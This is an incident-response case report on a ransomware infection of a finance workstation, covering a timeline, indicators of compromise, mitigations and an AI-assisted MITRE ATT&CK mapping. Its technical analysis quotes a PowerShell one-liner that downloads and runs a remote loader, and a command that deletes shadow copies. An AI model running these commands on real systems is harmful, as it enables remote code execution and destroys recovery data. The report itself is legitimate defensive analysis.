# [CASE] Ransomware Infection on Endpoint

### Case ID (slug-friendly)

ransom-2025-12-01

### Case Title

Ransomware Detected on Finance Department Workstation

### Executive Summary

A workstation in the Finance department exhibited signs of ransomware activity, including mass file encryption, suspicious PowerShell execution, and communication with known malicious IP addresses. Rapid response isolated the endpoint before lateral movement occurred.

### Timeline (Key Timestamps)

09:42 — EDR alert triggered: “Suspicious File Encryption Pattern Detected”.

09:43 — User reports inability to access files; ransom note appears on desktop.

09:44 — SOC isolates endpoint from the network.

09:50 — SIEM correlation links PowerShell script execution to malicious IP.

10:12 — IOC sweep initiated across all endpoints.

11:30 — No evidence of lateral movement found; incident contained.

### Artifacts / Indicators of Compromise (IOCs)

File Hash (SHA256):

a4df992c8e9fa1123c41cd8b322c87b99ef093a8ae01f92ced.... (payload)

b82af9391134fc119dbaa332fa... (ransom note generator)

Malicious IPs:

185.193.66.12

45.9.148.210

Domains:

darkvaultsync.net

payload-cdn.cc

Registry Persistence:

HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svhostService

Files Created:

C:\Users\<user>\AppData\Roaming\svhost.exe

C:\_RECOVER_FILES_.txt (ransom note)

### Technical Analysis

Initial Vector
Likely phishing email delivering a ZIP attachment containing a disguised executable (invoice.pdf.exe).
Email gateway logs show bypass due to “allowed trusted vendor domain” rule.

Malware Execution
EDR shows the user double-clicked the file → spawned cmd.exe → executed obfuscated PowerShell:

powershell -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('http://payload-cdn.cc/ldr.ps1'))"


Behavior Observed:

Enumerated drives and recursively encrypted documents (.docx, .pdf, .xlsx).

Contacted C2 servers at 185.193.66.12 via port 443 (self-signed TLS).

Dropped ransom note with Bitcoin instructions.

Attempted to stop Volume Shadow Copy Service:

vssadmin delete shadows /all /quiet


Lateral Movement Analysis:

No SMB brute force attempts.

No Kerberos anomalies.

No connection attempts to domain controllers.

SIEM Queries Summary:

No similar PowerShell commands found across fleet.

No signs of ransomware deployment via GPO or startup scripts.

Contained to a single workstation.

### Mitigation / Response Actions

Immediate Actions:

Isolated affected host via EDR.

Terminated malicious processes.

Collected ransom note and malware samples.

Blocked malicious IPs and domains at firewall.

Forced password reset for the affected user.

Remediation:

Restored workstation from known-good image.

Recovered user data from offline backup.

Patched mail gateway rule that allowed suspicious sender.

Enabled stricter attachment scanning for ZIP archives.

Environment-Wide Actions:

Ran IOC sweep across all endpoints.

Reconfigured PowerShell logging (Script Block Logging + Transcription).

Verified no shadow copies were manipulated on other hosts.

### Recommendations / Next Steps

Implement phishing training for Finance department.

Enforce application allowlisting for corporate endpoints.

Configure EDR automated isolation on high-severity ransomware detections.

Review backup policy (ensure 3-2-1 rule).

Enable DKIM, DMARC, and SPF hard fail for email security.

### AI Prompt & Response (AI Support Summary)

Prompt:
“Analyze ransomware-related PowerShell activity on infected endpoint and map behavior to MITRE ATT&CK.”

AI Response:
The PowerShell command downloads and executes a remote payload (MITRE T1059.001 PowerShell).
The binary enumerates file systems and encrypts documents (T1486 Data Encryption for Impact).
Shadow copy deletion aligns with T1490 Inhibit System Recovery.
Outbound HTTPS traffic to suspicious IPs indicates T1041 Exfiltration Over C2 Channel.
Activity is consistent with modern ransomware loaders such as LockBit-style droppers.

### Case Owner

Ievgen Bondarenko
